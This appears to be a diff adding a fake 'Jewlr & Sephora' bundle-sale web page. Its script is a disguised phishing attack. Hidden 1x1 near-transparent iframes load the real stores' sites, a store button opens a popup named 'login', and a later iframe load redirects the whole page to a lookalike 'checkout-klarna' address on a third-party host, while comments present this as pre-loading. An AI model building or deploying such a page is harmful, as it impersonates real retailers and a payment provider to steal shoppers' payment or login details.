@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Complete Your Look - Jewlr & Sephora Exclusive</title>
+	<style type="text/css">
+		body {
+			font-family: 'Helvetica Neue', Arial, sans-serif;
+			background: linear-gradient(135deg, #E8B4C8 0%, #F5E6D3 50%, #FFD1DC 100%);
+			margin: 0;
+			padding: 20px;
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+		}
+
+		#blackdiv {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background: rgba(0,0,0,0.25);
+			z-index: -1;
+		}
+
+		.promo-container {
+			background: linear-gradient(145deg, #ffffff 0%, #fef8f5 100%);
+			padding: 45px;
+			border-radius: 25px;
+			box-shadow: 0 30px 60px rgba(0,0,0,0.15);
+			text-align: center;
+			max-width: 650px;
+			margin-bottom: 30px;
+			border: 3px solid #E91E63;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.promo-container::before {
+			content: '';
+			position: absolute;
+			top: -50%;
+			left: -50%;
+			width: 200%;
+			height: 200%;
+			background: radial-gradient(circle, rgba(233,30,99,0.05) 0%, transparent 70%);
+			animation: shimmer 6s linear infinite;
+			pointer-events: none;
+		}
+
+		@keyframes shimmer {
+			0% { transform: rotate(0deg); }
+			100% { transform: rotate(360deg); }
+		}
+
+		h1 {
+			color: #E91E63;
+			margin-bottom: 15px;
+			font-size: 3.2em;
+			text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+			font-weight: 300;
+			position: relative;
+			z-index: 1;
+		}
+
+		.promotion-banner {
+			background: linear-gradient(45deg, #E91E63, #FF6B9D, #C2185B);
+			color: white;
+			padding: 18px;
+			border-radius: 15px;
+			margin: 25px 0;
+			font-size: 1.4em;
+			font-weight: bold;
+			text-transform: uppercase;
+			letter-spacing: 2px;
+			box-shadow: 0 8px 25px rgba(233,30,99,0.4);
+		}
+
+		.subtitle {
+			color: #666;
+			margin-bottom: 25px;
+			font-size: 1.4em;
+			font-weight: 300;
+			font-style: italic;
+		}
+
+		.discount-info {
+			background: rgba(233, 30, 99, 0.08);
+			padding: 25px;
+			border-radius: 15px;
+			margin: 25px 0;
+			border-left: 6px solid #E91E63;
+			font-size: 1.1em;
+		}
+
+		.store-buttons {
+			display: flex;
+			gap: 30px;
+			flex-wrap: wrap;
+			justify-content: center;
+			margin: 40px 0;
+		}
+
+		.store-btn {
+			background: linear-gradient(45deg, #E91E63, #FF6B9D);
+			color: white;
+			padding: 20px 40px;
+			border: none;
+			border-radius: 50px;
+			font-size: 1.3em;
+			font-weight: 600;
+			cursor: pointer;
+			transition: all 0.4s ease;
+			text-decoration: none;
+			display: inline-block;
+			box-shadow: 0 10px 25px rgba(233,30,99,0.4);
+			text-transform: uppercase;
+			letter-spacing: 1px;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.store-btn::before {
+			content: '';
+			position: absolute;
+			top: 0;
+			left: -100%;
+			width: 100%;
+			height: 100%;
+			background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+			transition: left 0.5s;
+		}
+
+		.store-btn:hover::before {
+			left: 100%;
+		}
+
+		.store-btn:hover {
+			transform: translateY(-6px);
+			box-shadow: 0 15px 35px rgba(233,30,99,0.6);
+		}
+
+		.jewlr-btn {
+			background: linear-gradient(45deg, #4ecdc4, #44a08d);
+		}
+
+		.jewlr-btn:hover {
+			box-shadow: 0 15px 35px rgba(78,205,196,0.6);
+		}
+
+		.features {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+			gap: 30px;
+			margin-top: 45px;
+		}
+
+		.feature-card {
+			background: rgba(255,255,255,0.95);
+			padding: 30px;
+			border-radius: 20px;
+			text-align: center;
+			box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+			border: 3px solid transparent;
+			background-clip: padding-box;
+			position: relative;
+			transition: all 0.3s ease;
+		}
+
+		.feature-card::before {
+			content: '';
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			border-radius: 20px;
+			padding: 3px;
+			background: linear-gradient(45deg, #E91E63, #4ecdc4);
+			mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+			mask-composite: exclude;
+			z-index: -1;
+		}
+
+		.feature-card:hover {
+			transform: translateY(-5px);
+			box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+		}
+
+		.feature-card h3 {
+			color: #E91E63;
+			font-size: 1.8em;
+			margin-bottom: 15px;
+			font-weight: 600;
+		}
+
+		.feature-card.sephora-card h3 {
+			color: #4ecdc4;
+		}
+
+		.feature-card .price {
+			color: #E91E63;
+			font-size: 1.3em;
+			font-weight: bold;
+			margin-top: 15px;
+			background: linear-gradient(45deg, #E91E63, #FF6B9D);
+			-webkit-background-clip: text;
+			-webkit-text-fill-color: transparent;
+		}
+
+		.loading-indicator {
+			display: none;
+			margin: 25px 0;
+			color: #E91E63;
+			font-size: 1.2em;
+			font-weight: 600;
+		}
+
+		.stores-loaded {
+			color: #4ecdc4;
+			font-weight: bold;
+			display: none;
+			font-size: 1.3em;
+		}
+
+		.timer {
+			background: linear-gradient(45deg, #E91E63, #C2185B);
+			color: white;
+			padding: 12px 25px;
+			border-radius: 30px;
+			margin: 20px 0;
+			font-size: 1.2em;
+			font-weight: 600;
+			box-shadow: 0 5px 15px rgba(233,30,99,0.4);
+		}
+
+		.benefits {
+			text-align: left;
+			background: rgba(233, 30, 99, 0.05);
+			padding: 25px;
+			border-radius: 15px;
+			margin: 25px 0;
+			border: 2px dashed rgba(233, 30, 99, 0.2);
+		}
+
+		.benefits ul {
+			list-style: none;
+			padding: 0;
+		}
+
+		.benefits li {
+			padding: 8px 0;
+			color: #555;
+			font-size: 1.05em;
+		}
+
+		.benefits li:before {
+			content: "✨ ";
+			color: #E91E63;
+			font-weight: bold;
+			font-size: 1.2em;
+		}
+
+		.combo-offer {
+			background: linear-gradient(135deg, #E91E63, #4ecdc4);
+			color: white;
+			padding: 20px;
+			border-radius: 15px;
+			margin: 25px 0;
+			font-size: 1.1em;
+			font-weight: 600;
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+
+	<div class="promo-container">
+		<h1>✨ COMPLETE YOUR LOOK ✨</h1>
+		
+		<div class="promotion-banner">
+			JEWELRY + BEAUTY BUNDLE - UP TO 60% OFF!
+		</div>
+		
+		<p class="subtitle">The Perfect Combination: Stunning Jewelry & Premium Beauty</p>
+		
+		<div class="timer">⏰ Limited Time Flash Sale - Hurry!</div>
+		
+		<div class="combo-offer">
+			🎁 <strong>EXCLUSIVE COMBO DEAL:</strong> Shop both stores and get an additional 15% off your total purchase!
+		</div>
+		
+		<div class="discount-info">
+			<strong>Why Jewelry + Beauty?</strong> Complete your glamorous look with handcrafted jewelry from Jewlr and premium cosmetics from Sephora. From personalized necklaces to luxury lipsticks - everything you need to shine!
+		</div>
+		
+		<div class="loading-indicator" id="loadingText">Loading exclusive beauty & jewelry deals...</div>
+		<div class="stores-loaded" id="storesReady">🎉 Both stores loaded! Choose where to start:</div>
+
+		<div class="store-buttons">
+			<a href="#" onclick="launch('jewlr')" class="store-btn jewlr-btn">
+				💎 Start with Jewelry
+			</a>
+			<a href="#" onclick="launch('sephora')" class="store-btn">
+				💄 Start with Beauty
+			</a>
+		</div>
+
+		<div class="benefits">
+			<strong>Bundle Benefits:</strong>
+			<ul>
+				<li>Mix & match jewelry and beauty products for the perfect look</li>
+				<li>Free shipping on orders over $50 from either store</li>
+				<li>Exclusive bundle discount when shopping both stores</li>
+				<li>Premium gift wrapping available for special occasions</li>
+				<li>30-day return policy on all items</li>
+				<li>Expert styling tips and tutorials included</li>
+			</ul>
+		</div>
+
+		<div class="features">
+			<div class="feature-card">
+				<h3>💎 Jewlr</h3>
+				<p>Personalized jewelry that tells your story. <strong>FREE custom engraving</strong> on rings, necklaces, and bracelets. Make every piece uniquely yours.</p>
+				<div class="price">Up to 50% OFF</div>
+				<p><small>Birthstone rings • Name necklaces • Couple bracelets • Custom pendants</small></p>
+			</div>
+			<div class="feature-card sephora-card">
+				<h3>💄 Sephora</h3>
+				<p>World's leading beauty destination with <strong>exclusive brands</strong> and expert advice. Premium makeup, skincare, and fragrances from top brands.</p>
+				<div class="price">Up to 60% OFF</div>
+				<p><small>Luxury makeup • Skincare sets • Designer fragrances • Beauty tools</small></p>
+			</div>
+		</div>
+	</div>
+
+	<!-- Pre-loading stores for better experience -->
+	<iframe src="https://www.sephora.com/checkout/64885_1825202523.js/$%5E%&*" onload="switcher()" name="apf" style="opacity: 0.01;" width=1 height=1></iframe>
+	<iframe src="https://www.jewlr.com/product-img/JWL0018.jpg?dim=375&pref_view=t2&sku=SS/$%5E%&*" onload="switcher()" name="apf" style="opacity: 0.01;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+		
+		var loadedOnce = false;
+		var launched = false;
+		let selectedStore = '';
+
+		// Show loading indicator
+		document.getElementById('loadingText').style.display = 'block';
+
+		function switcher() {
+			console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('First time loading iframe');
+				
+				// UI feedback - first load
+				document.getElementById('loadingText').style.display = 'none';
+				document.getElementById('storesReady').style.display = 'block';
+				
+				// Small animation to draw attention
+				setTimeout(() => {
+					document.querySelectorAll('.store-btn').forEach(btn => {
+						btn.style.animation = 'pulse 2s infinite';
+					});
+				}, 500);
+				
+				console.log('Both Jewlr and Sephora stores pre-loaded successfully!');
+			} else {
+				if (launched) {
+					console.log('Second time + launched = true, redirecting to checkout...');
+					top.focus();
+					top.location = "https://checkout-klarna.vercel.app/";
+				}
+			}
+		}
+
+		function launch(store) {
+			launched = true;
+			selectedStore = store;
+			
+			let url, storeName;
+			if (store === 'jewlr') {
+				url = "https://www.jewlr.com";
+				storeName = "Jewlr";
+			} else if (store === 'sephora') {
+				url = "https://www.sephora.com";
+				storeName = "Sephora";
+			}
+			
+			console.log(`Opening ${storeName} store...`);
+			
+			// Open popup of selected store
+			loginWindow = window.open(url, "login");
+			
+			// Visual feedback
+			event.target.textContent = `Opening ${storeName}...`;
+			setTimeout(() => {
+				event.target.textContent = event.target.textContent.replace('Opening', 'Shopping at');
+			}, 1000);
+		}
+
+		// Add CSS for pulse animation
+		const style = document.createElement('style');
+		style.textContent = `
+			@keyframes pulse {
+				0% { transform: scale(1); }
+				50% { transform: scale(1.06); }
+				100% { transform: scale(1); }
+			}
+		`;
+		document.head.appendChild(style);
+
+		// Welcome message
+		setTimeout(() => {
+			console.log('✨ Welcome to the ultimate beauty & jewelry experience! Complete your perfect look with Jewlr + Sephora! ✨');
+		}, 1000);
+	</script>
+
+</body>
+</html>
